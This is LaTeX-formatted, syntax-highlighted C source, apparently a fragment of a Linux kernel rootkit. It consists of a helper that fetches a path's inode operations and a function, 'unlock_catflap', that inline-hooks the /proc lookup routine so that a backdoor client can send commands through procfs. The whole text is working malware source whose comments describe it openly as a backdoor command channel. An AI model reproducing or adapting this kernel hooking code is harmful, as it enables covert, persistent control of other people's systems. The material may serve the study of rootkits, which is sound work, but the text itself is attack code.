\begin{Verbatim}[commandchars=\\\{\}]
\PYG{c+cm}{/**}
\PYG{c+cm}{ * Given a filepath, returns a pointer to its inode\PYGZus{}operations struct.}
\PYG{c+cm}{ *}
\PYG{c+cm}{ * @param path The filepath to retreive the i\PYGZus{}op struct pointer from.}
\PYG{c+cm}{ * @return A pointer to an i\PYGZus{}op struct for path if it exists, NULL otherwise.}
\PYG{c+cm}{ */}
\PYG{k}{struct} \PYG{n}{inode\PYGZus{}operations} \PYG{o}{*}\PYG{n+nf}{get\PYGZus{}iop}\PYG{p}{(}\PYG{k}{const} \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{path}\PYG{p}{)} \PYG{p}{\PYGZob{}}
    \PYG{k}{struct} \PYG{n}{file} \PYG{o}{*}\PYG{n}{f}\PYG{p}{;}

    \PYG{k}{if} \PYG{p}{((}\PYG{n}{f} \PYG{o}{=} \PYG{n}{filp\PYGZus{}open}\PYG{p}{(}\PYG{n}{path}\PYG{p}{,} \PYG{n}{O\PYGZus{}RDONLY}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{))} \PYG{o}{==} \PYG{n+nb}{NULL}\PYG{p}{)} \PYG{k}{return} \PYG{n+nb}{NULL}\PYG{p}{;}

    \PYG{k}{struct} \PYG{n}{inode\PYGZus{}operations} \PYG{o}{*}\PYG{n}{ret} \PYG{o}{=} \PYG{p}{(}\PYG{k}{struct} \PYG{n}{inode\PYGZus{}operations} \PYG{o}{*}\PYG{p}{)} \PYG{n}{f}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{f\PYGZus{}path}\PYG{p}{.}\PYG{n}{dentry}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{d\PYGZus{}inode}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{i\PYGZus{}op}\PYG{p}{;}
    \PYG{n}{filp\PYGZus{}close}\PYG{p}{(}\PYG{n}{f}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{);}

    \PYG{k}{return} \PYG{n}{ret}\PYG{p}{;}
\PYG{p}{\PYGZcb{}}

\PYG{c+cm}{/**}
\PYG{c+cm}{ * Hijacks the procfs in order to receive commands from our backdoor client. In}
\PYG{c+cm}{ * this case we\PYGZsq{}re using inode lookup in \PYGZdq{}/proc\PYGZdq{} as our command channel.}
\PYG{c+cm}{ *}
\PYG{c+cm}{ * This function works by finding the function pointer to the lookup method of}
\PYG{c+cm}{ * the \PYGZdq{}/proc\PYGZdq{} directory and performing an inline hook to modify its prologue}
\PYG{c+cm}{ * bytes to transfer execution to our replacement lookup routine.}
\PYG{c+cm}{ */}
\PYG{k+kt}{void} \PYG{n+nf}{unlock\PYGZus{}catflap}\PYG{p}{(}\PYG{k+kt}{void}\PYG{p}{)\PYGZob{}}

    \PYG{c+c1}{// Check we\PYGZsq{}re operating on a 3.1.1 kernel and above}
    \PYG{c+cp}{\PYGZsh{}if LINUX\PYGZus{}VERSION\PYGZus{}CODE \PYGZgt{}= KERNEL\PYGZus{}VERSION(3, 1, 1)}

        \PYG{c+c1}{// Perform our dastardly switcheroo of proc\PYGZhy{}\PYGZgt{}lookup with our own.}
        \PYG{n}{asm\PYGZus{}hook\PYGZus{}create}\PYG{p}{(}\PYG{n}{get\PYGZus{}iop}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}/proc\PYGZdq{}}\PYG{p}{)}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{lookup}\PYG{p}{,} \PYG{n}{proc\PYGZus{}lookup}\PYG{p}{);}
    \PYG{c+cp}{\PYGZsh{}endif}
\PYG{p}{\PYGZcb{}}
\end{Verbatim}
